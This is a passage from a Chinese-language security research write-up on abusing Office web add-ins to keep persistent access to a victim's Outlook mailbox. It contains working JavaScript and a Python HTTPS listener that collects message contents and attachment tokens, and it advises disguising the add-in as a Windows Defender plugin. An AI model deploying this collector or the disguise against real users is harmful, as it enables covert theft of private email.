            }
        }
接下来我们还需注册一个回调程序，以便在选定的邮件发生变化时接收通知。如果我们不执行该操作，那么当加载项加载后，只会给我们发送第一封邮件的详细信息：
    // The Office initialize function must be run each time a new page is loaded. 
        Office.initialize = function (reason) {
            $(document).ready(function () {
                //register the ItemChanged event hander then call the loadProps method to grab some data
                Office.context.mailbox.addHandlerAsync(Office.EventType.ItemChanged, itemChanged);
                //fire off the call to get the callback token we need to download attachments - not needed yet but its just easier this way
                getAttachmentToken();
                loadProps(Office.context.mailbox.item);
        });
        };
    //event handler for item change event (i.e. new message selected)
        function itemChanged(eventArgs) {
            loadProps(Office.context.mailbox.item);
        }
## 七、接收数据
现在我们已经创建能够发送已选定邮件详细信息的JavaScript代码。我们还需要使用其他代码来捕捉并显示这些信息。由于加载项必须使用HTTPS协议进行通信，因此我们的监听器必须能够接受HTTPS流量。我们可以修改基于HTTP服务器的Python3代码，完成该任务：
    class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Hello')
        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length)
            self.send_response(200)
            self.end_headers()
            response = BytesIO()
            response.write(b'Hello')
            self.wfile.write(response.getvalue())
            decoded = unquote(body.decode("utf-8"))
            Helpers.print_Message(decoded)
    httpd = HTTPServer(('', 8000), SimpleHTTPRequestHandler)
    httpd.socket  = ssl.wrap_socket(httpd.socket, keyfile=' /certs/privkey.pem', certfile=' /certs/cert.pem', server_side=True)
    httpd.serve_forever()
这里我们覆盖了GET及POST处理函数，创建了所需的证书文件，以便正确接收HTTPS请求。
接下来，我们需要处理加载项发送过来的JSON数据。我们可以在客户端处理这些数据，只发送我们感兴趣的部分数据。然而让客户端发送所有可用的数据，并让我们的处理程序处理这些数据也是不错的选择。通过这种方法，我们可以根据具体需求提取其他数据：
    class Helpers:
        def HTMLDecode(s):
            return s.replace("+", " ")
        def buildEmail(address):
            return address['name'] + " "
        def buildEmailAddresses(addresses):
            if addresses:
                returnString = ""
                for address in addresses:
                    returnString = returnString + Helpers. buildEmail(address) + 'n'
                return returnString
            return "None"
        def getAttachmentName(attachment):
            return attachment['name'] + " (ID:" + attachment['id'] +")"
        def getAttachments(attachments):
            if attachments:
                returnString = ""
                for attachment in attachments:
                    returnString = returnString + Helpers.getAttachmentName(attachment) + 'n'
                return returnString
            return "0"
        def print_Message(decoded_data):
            #split the string into item data and body data
            split = decoded_data.partition("&item_body=")
            item_json = split[0]
            #now we need the body data and the token data
            split2 = split[2].partition("&token=")
            body_data = split2[0]
            token_data = split2[2]
            #item_json now needs to be parsed to grab what we need
            #strip the first 5 chars ("item=") from the json data
            parsed_json = json.loads(item_json[5:])
            item_json = parsed_json['_data$p$0']['_data$p$0']
            #we also need to parse the token object
            token_json = json.loads(token_data)
            #grab the values we want to display
            _from = Helpers.buildEmail(item_json['from'])
            _sender = Helpers.buildEmail(item_json['sender'])
            _to = Helpers.buildEmailAddresses(item_json['to'])
            _subject = item_json['subject']
            _attachment_count = Helpers.getAttachments(item_json.get("attachments", None))
            _ewsUrl = item_json['ewsUrl']
            _token = token_json['attachmentToken']
            print(Fore.RED + "[*] New Message Received" + Style.RESET_ALL)
            print("From: " + Helpers.HTMLDecode(_from))
            print("Sender: " + Helpers.HTMLDecode(_sender))
            print("To: " + Helpers.HTMLDecode(_to))
            print("Subject: " + Helpers.HTMLDecode(_subject))
            print("Body: " + Helpers.HTMLDecode(body_data))
            if _attachment_count != "0":
                print("Attachment Details: n")
                print(Helpers.HTMLDecode(_attachment_count))
                print("Use these values to download attachments...n")
                print("ewsURL: " + _ewsUrl)
                print("Access Token: " + _token)
            print(Fore.RED + "------------------------" + Style.RESET_ALL)
具体的函数代码这里不再赘述，最终我们可以利用上述代码解析JSON数据，将其拆分成item、正文以及API Token对象，提取并打印出我们感兴趣的信息。
现在如果我们部署构造好的加载项，当受害者访问邮件时我们应该能捕捉到邮件的具体内容：
上图中我隐去了API令牌信息，然而攻击者可以使用API令牌来访问EWS
API，下载附件。虽然这超出了本文的研究范围，但需要注意的是，这个令牌只限于特定的附件ID，似乎不能用来进一步访问API。
## 八、界面问题
还有一件事情现在我们还没有真正去考虑：HTML页面。Mike和Beau在Wild West Hackin’
Fest的演讲中提到，攻击者有可能隐藏加载项的UI。不幸的是，目前我尚未成功复现这种场景。虽然有人曾要求官方添加该功能，但该功能似乎尚未开发出来。在研究过程中，我们一直能看到固定大小的一个附加项面板。
为了解决这个问题，攻击者可以采取一些社会工程学方法。我们可以按照自己喜欢的方式设置加载项的样式，在这个演示场景中，我将其伪装成一个Windows
Defender的插件：
最终，我们可以自己设置加载项的样式以适配目标环境，但直到目前为止，我们依然无法删除UI。
## 九、总结
在本文中，我们介绍了如何利用Office JavaScript
API来获得受害者邮箱的持久访问权限。在这个攻击场景中，我们通过凭据破解或者其他攻击手段获取了目标邮箱访问权限，然后部署了一个加载项，这样即使受害者更改了密码，我们也能持续访问目标收件箱内容。不幸的是，我们必须依赖一些社会工程学技巧，因为（目前）我们无法隐藏加载项的UI。
我们还可以通过其他方式来利用web加载项。我们可以为其他Office产品构建加载项，获取电子表格、演示文稿和SharePoint内容的访问权限。如果目标使用内部开发的加载项，我们还能修改JavaScript文件，使其包含恶意内容。微软并没有在manifest文件中包含任何文件签名机制，因此无法阻止我们修改JavaScript文件。
微软还允许开发人员将这些加载项推送到应用商店中，用户可以通过应用商店来安装加载项，这种方式隐藏的风险不言而喻。
最后还需要注意一点，当通过O365门户进行部署时，这些加载项也会与桌面版的Outlook应用同步。不幸的是，前文提到的pin功能似乎无法在web门户和桌面应用之间同步。如果未来这一点有所变化，那么这种攻击方法就更有用武之地。